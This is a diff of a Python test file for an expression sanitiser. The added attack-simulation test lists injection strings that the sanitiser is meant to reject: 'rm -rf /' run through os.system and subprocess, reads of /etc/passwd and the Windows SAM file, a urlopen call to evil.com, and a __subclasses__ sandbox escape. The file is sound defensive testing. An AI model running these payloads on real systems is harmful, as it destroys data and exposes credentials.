@@ -447,70 +447,6 @@ class TestExpressionSanitiser:
         for pattern in expected_patterns:
             assert pattern in patterns
 
-    def test_boolean_literal_handling(self, expression_sanitiser: ExpressionSanitiser) -> None:
-        """Test boolean literal handling."""
-        variables: Dict[str, Any] = {}
-
-        # Test different boolean representations
-        boolean_expressions = [
-            "True == True",
-            "False == False",
-            "true == True",  # Converted to True
-            "false == False",  # Converted to False
-        ]
-
-        for expr in boolean_expressions:
-            # Should not raise exception
-            expression_sanitiser.sanitise_expression(expr, variables)
-
-    def test_comparison_operators(self, expression_sanitiser: ExpressionSanitiser) -> None:
-        """Test all comparison operators."""
-        variables = {"num": 5, "text": "hello"}
-
-        comparison_expressions = [
-            "num == 5",
-            "num != 3",
-            "num < 10",
-            "num <= 5",
-            "num > 2",
-            "num >= 5",
-            'text in "hello world"',
-            'text not in "goodbye"',
-        ]
-
-        for expr in comparison_expressions:
-            expression_sanitiser.sanitise_expression(expr, variables)
-
-    def test_boolean_operators(self, expression_sanitiser: ExpressionSanitiser) -> None:
-        """Test boolean operators."""
-        variables = {"a": True, "b": False, "c": True}
-
-        boolean_expressions = [
-            "a and b",
-            "a or b",
-            "not a",
-            "a and b or c",
-            "not (a and b)",
-            "(a or b) and c",
-        ]
-
-        for expr in boolean_expressions:
-            expression_sanitiser.sanitise_expression(expr, variables)
-
-    def test_list_tuple_literals(self, expression_sanitiser: ExpressionSanitiser) -> None:
-        """Test list and tuple literals."""
-        variables = {"item": 2}
-
-        literal_expressions = [
-            "item in [1, 2, 3]",
-            "item in (1, 2, 3)",
-            "[1, 2] == [1, 2]",
-            "(1, 2) == (1, 2)",
-        ]
-
-        for expr in literal_expressions:
-            expression_sanitiser.sanitise_expression(expr, variables)
-
     def test_production_security_limits(self, production_sanitiser: ExpressionSanitiser) -> None:
         """Test stricter limits in production mode."""
         variables = {"test": True}
@@ -532,20 +468,61 @@ class TestExpressionSanitiser:
             assert e.reason is not None
             assert "malicious" in e.expression or len(e.expression) == 100  # Truncated
 
-    def test_edge_case_expressions(self, expression_sanitiser: ExpressionSanitiser) -> None:
-        """Test various edge case expressions."""
-        variables = {"items": [1, 2, 3], "obj": {"key": "value"}, "flag": True}
+    def test_comprehensive_attack_simulation(self, expression_sanitiser: ExpressionSanitiser) -> None:
+        """Test comprehensive attack simulation covering all security vectors."""
+        variables = {"user": {"name": "test"}, "items": [1, 2, 3]}
 
-        edge_cases = [
-            "items.length == 3",  # Special length property
-            "flag and items.length > 0",
-            'obj.key == "value"',
-            "items[0] == 1 and items[-1] == 3",
+        # Comprehensive attack vectors
+        attack_vectors = [
+            # Code injection
+            "__import__('os').system('rm -rf /')",
+            "exec('import os; os.system(\"malicious\")')",
+            "eval('dangerous_code')",
+            # Prototype pollution
+            "__proto__.isAdmin = true",
+            "constructor.prototype.evil = payload",
+            # File system access
+            "open('/etc/passwd').read()",
+            "open('C:\\Windows\\System32\\config\\SAM')",
+            # Network access
+            "__import__('urllib').request.urlopen('http://evil.com')",
+            # Process execution
+            "__import__('subprocess').call(['rm', '-rf', '/'])",
+            # Memory exhaustion
+            "[0] * (10**9)",  # Large memory allocation
+            # Infinite loops (syntax that could cause loops)
+            "True and True and True and True",  # Not infinite but demonstrates pattern
+            # Variable access bypass attempts
+            "user.__class__.__bases__[0].__subclasses__()",
+            "user.__dict__.update({'admin': True})",
+            # Encoding bypass attempts
+            "\\x65\\x78\\x65\\x63('malicious')",  # hex encoded 'exec'
+            "\\u0065\\u0078\\u0065\\u0063('malicious')",  # unicode encoded 'exec'
         ]
 
-        for expr in edge_cases:
-            try:
-                expression_sanitiser.sanitise_expression(expr, variables)
-            except ExpressionSecurityError:
-                # Some might fail due to length property handling
-                pass
+        for attack in attack_vectors:
+            with pytest.raises(ExpressionSecurityError):
+                expression_sanitiser.sanitise_expression(attack, variables)
+
+    def test_performance_dos_prevention(self, production_sanitiser: ExpressionSanitiser) -> None:
+        """Test prevention of performance-based denial of service attacks."""
+        variables = {"test": True}
+
+        # CPU exhaustion through deep nesting
+        deep_expr = "test"
+        for _ in range(50):  # Very deep nesting
+            deep_expr = f"({deep_expr} and test)"
+
+        with pytest.raises(ExpressionSecurityError):
+            production_sanitiser.sanitise_expression(deep_expr, variables)
+
+        # Memory exhaustion through large literals
+        large_literal = "[" + ", ".join([str(i) for i in range(1000)]) + "]"
+        with pytest.raises(ExpressionSecurityError):
+            production_sanitiser.sanitise_expression(f"test in {large_literal}", variables)
+
+        # Variable reference explosion
+        many_vars = {f"var{i}": True for i in range(200)}
+        var_expr = " and ".join([f"var{i} == True" for i in range(200)])
+        with pytest.raises(ExpressionSecurityError):
+            production_sanitiser.sanitise_expression(var_expr, many_vars)
